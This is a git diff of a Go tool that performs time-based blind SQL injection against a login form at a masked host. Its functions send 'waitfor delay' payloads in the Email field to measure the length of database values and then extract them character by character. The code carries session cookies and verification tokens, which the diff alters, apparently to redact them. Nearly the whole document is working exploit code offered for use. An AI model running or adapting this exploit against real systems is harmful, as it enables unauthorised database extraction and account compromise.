@@ -28,7 +28,7 @@ func Requester(uurl string, data string,method string)  bool {
 	client := HTTPclient
 	req, _ := http.NewRequest(method, uurl, strings.NewReader(data))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("Cookie","AWSALB=oTDN73ae4k7mmGHn8U6i+MVVOwUiB6wrSunAfiVn4JH6E4+sWyQ/d1nTn4PebbY42pRIN82wCaaOxQ1rf+K5lPRFGqX8ZNpAkP8YbxE/vxh3z9b1jdXQmcXTFKZx;AWSALBCORS=oTDN73ae4k7mmGHn8U6i+MVVOwUiB6wrSunAfiVn4JH6E4+sWyQ/d1nTn4PebbY42pRIN82wCaaOxQ1rf+K5lPRFGqX8ZNpAkP8YbxE/vxh3z9b1jdXQmcXTFKZx;__RequestVerificationToken=DydZaaCC9ZvRYOTTBQYclQOfnEe8hGKTJafS7GHRFcuSzpXY8Z4WnvHgT5uvvQcQhMK37HuxByKU4oz3iT0jBVsUsjAU9-PDEzKnTrcYrW41;ASP.NET_SessionId=grmc2mzsthga42jyfew5l2su")
+	req.Header.Set("Cookie","AWSALB=oTDN73ae4k7mmGHn8U6i+MVVOwUiB6wrSunAfiVn4JH6E4+sWyQ/d1nTn4PebbY42pRIN82wCaarf+K5lPRFGqX8ZNpAkP8YbxE/vxh3z9b1jdXQmcXTFKZx;AWSALBCORS=oTDN73ae4k7mmGHn8U6i+MVVOwwrSunAfiVn4JH6E4+sWyQ/d1nTn4PebbY42pRIN82wCaaOxQ1rf+K5lPRFGqX8ZNpAkbxE/vxh3z9b1jdXQmcXTFKZx;__RequestVerificationToken=DydZa9ZvRYOTTBQYclQOfnEe8hGKTJafS7GHRFcuSzpXY8Z4WnvHgT5uvvQcQhMK37HuxByKU4oz3iT0jBVsUsjAU9-PDEzKnTrcYrW41;ASP.NET_SessionId=grmc2sthga42jyfew5l2su")
 		_, err := client.Do(req)
 		if err != nil{
 			return true
@@ -40,7 +40,7 @@ func Requester(uurl string, data string,method string)  bool {
 func Getlen(s string) int{
 	var i int
 	for i = 0 ;i<150;i++ {
-		payload := fmt.Sprintf("Email=LSFajxJg';if%%20(len(%s)%%20=%%20%d)%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,i)
+		payload := fmt.Sprintf("Email=LSFajxJg';if%%20(len(%s)%%20=%%20%d)%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,i)
 		if Requester("https://**.**.com/",payload,"POST"){
 			fmt.Println(s,"len is  ",i)
 			return i
@@ -58,7 +58,7 @@ func Getinfo(s string) {
 	for i := 0 ;i<num;i++ {
 		str := "abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_."
 		for _,y := range str {
-			payload := fmt.Sprintf("Email=LSFajxJg';if%%20(%s%%20like%%20'%s%s%%')%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,info,string(y))
+			payload := fmt.Sprintf("Email=LSFajxJg';if%%20(%s%%20like%%20'%s%s%%')%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&validpg=n",s,info,string(y))
 			if Requester("https://**.**.com/",payload,"POST"){
 				info = info + string(y)
 				fmt.Println(s,"is",info)
